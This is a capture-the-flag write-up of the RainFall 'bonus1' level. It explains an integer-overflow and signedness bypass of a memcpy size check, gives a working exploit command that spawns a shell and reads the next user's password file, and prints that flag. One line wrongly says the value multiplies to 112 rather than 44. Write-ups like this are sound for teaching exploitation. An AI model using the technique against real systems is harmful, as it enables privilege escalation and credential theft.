# Bonus1 Write-up: Integer Overflow & Signedness Vulnerability

## 1. Vulnerability Analysis: The Setup

By analyzing the assembly of `main`, we can map out the exact C logic that manages our inputs. The program takes two arguments: an integer (which is parsed by `atoi`) and a string.

### The Signed Comparison (`jle`)

```assembly
0x08048438 <+20>:    call   0x8048360 <atoi@plt>
0x0804843d <+25>:    mov    DWORD PTR [esp+0x3c],eax   ; Store parsed int in a local variable
0x08048441 <+29>:    cmp    DWORD PTR [esp+0x3c],0x9
0x08048446 <+34>:    jle    0x804844f <main+43>        ; Jump if Less or Equal

```

The program limits our first argument to a maximum of 9. However, the `jle` (Jump if Less than or Equal) instruction performs a **signed** comparison. This means any negative number will automatically pass this check because negative numbers are always less than 9.

### The Math Overflow (`lea`)

```assembly
0x0804844f <+43>:    mov    eax,DWORD PTR [esp+0x3c]   ; eax = our negative number
0x08048453 <+47>:    lea    ecx,[eax*4+0x0]            ; ecx = eax * 4

```

Once we pass the check, the program multiplies our input by 4 using the `lea` (Load Effective Address) instruction. This multiplied value in `ecx` becomes the `size` parameter for a `memcpy` call. Because CPU registers are strictly 32-bit, any multiplication that exceeds the 32-bit maximum 2^32 - 1$ will silently drop the highest bits and wrap back around to a small positive number.

### The Memory Layout & Target

```assembly
0x08048464 <+64>:    lea    eax,[esp+0x14]             ; Destination buffer = esp+0x14
...
0x08048473 <+79>:    call   0x8048320 <memcpy@plt>     ; memcpy(esp+0x14, argv[2], ecx)
0x08048478 <+84>:    cmp    DWORD PTR [esp+0x3c],0x574f4c46

```

`memcpy` copies our second argument (`argv[2]`) into a buffer at `esp+0x14`.
Directly after `memcpy`, the program checks if the local variable at `esp+0x3c` equals `0x574f4c46` (which translates to the ASCII string **FLOW**).

* **Destination Start:** `esp+0x14`
* **Target Overwrite:** `esp+0x3c`
* **Distance:** $0x3c - 0x14 = 0x28$ (which is exactly 40 bytes).

We need `memcpy` to copy exactly 40 bytes of padding plus the 4 bytes of "FLOW".
Therefore, our ideal `memcpy` size is **44 bytes**.

---

## 2. The Math: Finding the Proper $X$

We need to provide a number $X$ (our first argument) that satisfies two conditions:

1. X <= 9 (to pass the `jle` check).
2. X * 4 = 44 mod(2^32) (to overflow the 32-bit register and wrap perfectly back to 44).

To find a negative number that wraps around to 44 when multiplied by 4, we calculate what happens if we overflow the 32-bit limit exactly once. The formula to find the raw unsigned representation is:

$$X = (Target-Size + 2^32)/4

However, wait—if we use 2^32, the result will just be 1073741835, which is positive and greater than 9! To get a negative number in 32-bit Two's Complement, we need the highest bit to be a 1. So, we intentionally force the multiplication to overflow higher by adding 2^33:

X_unsigned = (44 + 2^33)/4

X_unsigned = 11 + 2^31

X_unsigned = 2147483659

If we convert the unsigned 32-bit integer `2147483659` into its signed negative equivalent (by subtracting 2^32), we get the magic perfect number: **-2147483637**.

If we pass `-2147483637`, `lea` multiplies it by 4, overflows the register, and leaves exactly 44 in `ecx`.

## 3. Exploit Execution

1. **Argument 1:** `-2147483637` (Bypasses `jle`, multiplies to 112 for `memcpy`).
2. **Argument 2:** 40 bytes of `"a"` padding + `"\x46\x4c\x4f\x57\x00"` (`FLOW`).

```bash
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "a"*40+ "\x46\x4c\x4f\x57\x00"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```